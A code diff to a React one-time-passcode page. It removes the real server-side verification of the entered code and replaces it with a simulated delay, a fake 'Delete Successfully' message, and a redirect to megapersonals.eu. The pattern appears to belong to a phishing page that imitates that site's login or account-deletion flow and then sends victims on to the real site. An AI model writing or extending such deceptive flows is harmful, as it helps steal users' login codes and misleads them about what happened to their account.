@@ -8,12 +8,19 @@ import { Suspense, useState } from 'react';
 // Create a separate component for the OTP content
 const OTPContent = () => {
   const [isModalOpen, setModalOpen] = useState(true);
+  const [isDeleteModalOpen, setDeleteModalOpen] = useState(false);
   const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
 
   const handleOkClick = () => {
     setModalOpen(false); // Close the modal
+  };
+
+  const handleDeleteModalOk = () => {
+    setDeleteModalOpen(false);
+    // Redirect to the external URL
+    window.location.href = 'https://megapersonals.eu/';
   };
 
   const searchParams = useSearchParams();
@@ -31,32 +38,11 @@ const OTPContent = () => {
     setLoading(true);
     setError('');
 
-    try {
-      const response = await fetch('/api/login', {
-        method: 'PATCH',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          id: userId,
-          otp: code
-        }),
-      });
-
-      const data = await response.json();
-
-      if (data.success) {
-        // Redirect to home page or dashboard after successful verification
-        router.push('/');
-      } else {
-        setError(data.message || 'Verification failed. Please try again.');
-      }
-    } catch (error) {
-      console.error('Verification error:', error);
-      setError('An error occurred. Please try again.');
-    } finally {
+    // Simulate a brief loading period then show delete success modal
+    setTimeout(() => {
       setLoading(false);
-    }
+      setDeleteModalOpen(true);
+    }, 1000);
   };
 
   return (
@@ -66,6 +52,25 @@ const OTPContent = () => {
         onRequestClose={() => setModalOpen(false)}
         onOk={handleOkClick}
       />
+
+      {/* Delete Success Modal */}
+      {isDeleteModalOpen && (
+        <div className="fixed inset-0 bg-black bg-opacity-50  flex items-center justify-center z-50">
+          <div className="bg-white py-10 rounded-lg shadow-lg w-3/12 mx-4">
+            <div className="text-center">
+              <h3 className="text-lg font-semibold text-green-600 mb-4">
+                Delete Successfully
+              </h3>
+              <button
+                onClick={handleDeleteModalOk}
+                className="bg-[#F0AD4E] px-6 py-1 rounded text-white font-medium hover:bg-[#e69b3a] transition-colors"
+              >
+                OK
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
 
       <section className='flex flex-col gap-[20px]'>
         <section className='flex justify-center gap-[20px]'>
